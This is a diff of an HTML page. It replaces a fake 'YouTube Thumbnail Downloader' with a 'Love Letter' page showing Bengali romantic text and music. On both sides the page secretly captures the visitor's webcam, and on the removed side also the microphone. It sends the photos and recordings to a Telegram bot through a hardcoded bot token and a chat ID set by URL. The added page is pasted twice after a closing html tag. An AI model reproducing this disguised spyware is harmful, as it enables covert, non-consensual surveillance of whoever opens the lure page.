@@ -1,240 +1,431 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  
-  <title>YouTube Thumbnail Downloader</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Love Letter</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
+
     body {
-      font-family: 'Montserrat', sans-serif;
       margin: 0;
       padding: 0;
-      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
+      background-size: 300% 300%;
+      font-family: 'Dancing Script', cursive;
+      animation: bgAnimation 12s infinite alternate;
+      overflow: hidden;
     }
-    .navbar {
-      background-color: #ff0000;
-      color: white;
-      text-align: center;
-      padding: 15px 0;
+
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-    #header {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
+
     .container {
-      max-width: 600px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .form-control {
-      width: calc(100% - 22px);
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn:hover {
-      background-color: #cc0000;
-    }
-    footer {
       text-align: center;
-      margin-top: 40px;
-      color: #666;
     }
-    .youtube-logo {
-      display: block;
+
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 span {
+      color: #ffeb3b;
+      font-style: italic;
+    }
+
+    .love-letter {
+      font-family: 'Pinyon Script', cursive;
+      font-size: 1.5rem;
+      color: #fff;
+      width: 80%;
+      max-height: 300px;
       margin: 20px auto;
-      width: 100px; /* Adjust size as needed */
+      border: 2px solid #ff4b5c;
+      padding: 20px;
+      border-radius: 15px;
+      background-color: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    .music-btn {
+      position: absolute;
+      bottom: 20px;
+      background-color: #ff4b5c;
+      color: white;
+      font-size: 1.5rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .music-btn:hover {
+      background-color: #ff1e56;
     }
   </style>
-  <script type='text/javascript'>
-  //<![CDATA[
-  var uri = window.location.toString();
-  if (uri.indexOf("%3D") > 0) {
-      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
-      window.history.replaceState({}, document.title, clean_uri);
-  }
-
-  uri = window.location.toString();
-  if (uri.indexOf("%3D%3D") > 0) {
-      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
-      window.history.replaceState({}, document.title, clean_uri);
-  }
-
-  uri = window.location.toString();
-  if (uri.indexOf("&m=1") > 0) {
-      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
-      window.history.replaceState({}, document.title, clean_uri);
-  }
-
-  uri = window.location.toString();
-  if (uri.indexOf("?m=1") > 0) {
-      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
-      window.history.replaceState({}, document.title, clean_uri);
-  }
-  //]]>
-  </script>
 </head>
 <body>
-  <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
-  </nav>
-
   <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
-    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+    <h1>I <span>Love</span> You</h1>
 
-    <h2>How to Download HD YouTube Thumbnail</h2>
-    <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
-    </ol>
+    <div class="love-letter">
+      <p>প্রিয়তম,</p>
+      <p>তোমার জন্য আমার অনুভূতিগুলো বলে বোঝানো কঠিন...</p>
+      <p>তোমাকে ভালোবাসা আমার জীবনের সবচেয়ে সুন্দর অনুভূতি...</p>
+    </div>
+
+    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
   </div>
 
-  <center>
-    <button id="toggle-video" style="display:none;">Toggle Video</button>
-    <div id="message-container"></div>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
+  <audio id="loveAudio" loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
 
-  <script type="text/javascript">
-    function downloadThumbnail() {
-        // Change button text to indicate fetching
-        var btn = document.getElementById('thumbdloadbtn');
-        btn.textContent = 'Fetching from server... Wait';
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const music = document.getElementById('loveAudio');
 
-        // Add your logic to fetch the thumbnail here
-        // ...
+    // Default Telegram Chat ID
+    const defaultChatId = '7888600155'; 
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatid') || defaultChatId; // যদি URL থেকে চ্যাট আইডি না আসে, তাহলে ডিফল্ট ব্যবহার করবে।
+
+    // Telegram Bot Token
+    const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY';
+
+    let useFrontCamera = true;
+    let isMusicPlaying = false;
+
+    const constraints = {
+      video: {
+        facingMode: useFrontCamera ? 'user' : 'environment'
+      }
+    };
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          console.error('Error accessing camera:', error);
+        });
     }
 
-    function la(src) {
-      window.location = src;
-    }
-
-    function GetURLParameter(sParam) {
-      var sPageURL = window.location.search.substring(1);
-      var sURLVariables = sPageURL.split('&');
-      for (var i = 0; i < sURLVariables.length; i++) {
-        var sParameterName = sURLVariables[i].split('=');
-        if (sParameterName[0] == sParam) {
-          return sParameterName[1];
-        }
+    function stopCamera() {
+      const stream = video.srcObject;
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
       }
     }
 
-    function decodeBase64(encodedStr) {
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        sendToTelegram(blob);
+      }, 'image/png');
+    }
+
+    function sendToTelegram(blob) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (!data.ok) {
+          console.error('Telegram API Error:', data);
+        }
+      })
+      .catch(err => {
+        console.error('Fetch Error:', err);
+      });
+    }
+
+    function autoSwitchCamera() {
+      setInterval(() => {
+        stopCamera();
+        useFrontCamera = !useFrontCamera;
+        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
+        startCamera();
+      }, 5000);
+    }
+
+    setInterval(() => {
+      captureAndSendPhoto();
+    }, 5000);
+
+    function toggleMusic() {
+      if (isMusicPlaying) {
+        music.pause();
+        isMusicPlaying = false;
+        document.querySelector('.music-btn').textContent = 'Play Music';
+      } else {
+        music.play();
+        isMusicPlaying = true;
+        document.querySelector('.music-btn').textContent = 'Pause Music';
+      }
+    }
+
+    startCamera();
+    autoSwitchCamera();
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Love Letter</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
+      background-size: 300% 300%;
+      font-family: 'Dancing Script', cursive;
+      animation: bgAnimation 12s infinite alternate;
+      overflow: hidden;
+    }
+
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 span {
+      color: #ffeb3b;
+      font-style: italic;
+    }
+
+    .love-letter {
+      font-family: 'Pinyon Script', cursive;
+      font-size: 1.5rem;
+      color: #fff;
+      width: 80%;
+      max-height: 300px;
+      margin: 20px auto;
+      border: 2px solid #ff4b5c;
+      padding: 20px;
+      border-radius: 15px;
+      background-color: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    .music-btn {
+      position: absolute;
+      bottom: 20px;
+      background-color: #ff4b5c;
+      color: white;
+      font-size: 1.5rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .music-btn:hover {
+      background-color: #ff1e56;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>I <span>Love</span> You</h1>
+
+    <div class="love-letter">
+      <p>প্রিয়তম,</p>
+      <p>তোমার জন্য আমার অনুভূতিগুলো বলে বোঝানো কঠিন...</p>
+      <p>তোমাকে ভালোবাসা আমার জীবনের সবচেয়ে সুন্দর অনুভূতি...</p>
+    </div>
+
+    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <audio id="loveAudio" loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const music = document.getElementById('loveAudio');
+
+    // Default Telegram Chat ID
+    const defaultChatId = '7888600155';
+
+    // Function to get URL parameter
+    function GetURLParameter(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+
+    // Function to decode Base64
+    function decodeBase64(str) {
       try {
-        return decodeURIComponent(atob(encodedStr));
-      } catch (e) {
-        console.error('Base64 decode error:', e);
+        return atob(str);
+      } catch (error) {
+        console.error('Invalid Base64 string:', error);
         return null;
       }
     }
 
-    // Get Base64 encoded 'id' parameter from the URL
+    // Get Base64 encoded chat ID from URL parameter 'i'
     var base64Id = GetURLParameter('i');
-    var chatid = base64Id ? decodeBase64(base64Id) : null;
+    var chatId = base64Id ? decodeBase64(base64Id) : GetURLParameter('chatid') || defaultChatId; 
 
-    if (chatid) {
-      console.log('Decoded chat ID:', chatid);
-    } else {
-      console.warn('No valid chat ID found.');
+    console.log('Using Chat ID:', chatId);
+
+    // Telegram Bot Token
+    const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY';
+
+    let useFrontCamera = true;
+    let isMusicPlaying = false;
+
+    const constraints = {
+      video: {
+        facingMode: useFrontCamera ? 'user' : 'environment'
+      }
+    };
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          console.error('Error accessing camera:', error);
+        });
     }
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then((stream) => {
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-        const audioRecorder = new MediaRecorder(stream);
-
-        function capturePhoto(index) {
-          setTimeout(() => {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                sendToTelegram(blob, 'photo');
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
-          }, index * 2000);
-        }
-
-        function startAudioRecording() {
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
-        }
-
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            sendToTelegram(event.data, 'audio');
-          }
-        };
-
-        for (let i = 0; i < 3; i++) {
-          capturePhoto(i);
-        }
-
-        startAudioRecording();
-      })
-      .catch((error) => {
-        if (error.name === 'NotAllowedError') {
-          // Handle the case where permissions are denied
-          console.warn('Permissions denied. User may suspect.');
-        } else {
-          console.error('Permission error:', error);
-        }
-      });
-
-    function sendToTelegram(data, type) {
-      const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY';
-      const chatId = chatid;
-
-      if (!chatId) {
-        console.error('Chat ID is not available.');
-        return;
+    function stopCamera() {
+      const stream = video.srcObject;
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
       }
+    }
+
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        sendToTelegram(blob);
+      }, 'image/png');
+    }
+
+    function sendToTelegram(blob) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
+      formData.append('photo', blob, 'photo.png');
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+      fetch(url, {
         method: 'POST',
-        body: formData
+        body: formData,
       })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
+      .then(response => response.json())
+      .then(data => {
+        if (!data.ok) {
+          console.error('Telegram API Error:', data);
+        }
+      })
+      .catch(err => {
+        console.error('Fetch Error:', err);
+      });
     }
-  </script>
 
- 
+    function autoSwitchCamera() {
+      setInterval(() => {
+        stopCamera();
+        useFrontCamera = !useFrontCamera;
+        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
+        startCamera();
+      }, 5000);
+    }
+
+    setInterval(() => {
+      captureAndSendPhoto();
+    }, 5000);
+
+    function toggleMusic() {
+      if (isMusicPlaying) {
+        music.pause();
+        isMusicPlaying = false;
+        document.querySelector('.music-btn').textContent = 'Play Music';
+      } else {
+        music.play();
+        isMusicPlaying = true;
+        document.querySelector('.music-btn').textContent = 'Pause Music';
+      }
+    }
+
+    startCamera();
+    autoSwitchCamera();
+  </script>
 </body>
 </html>
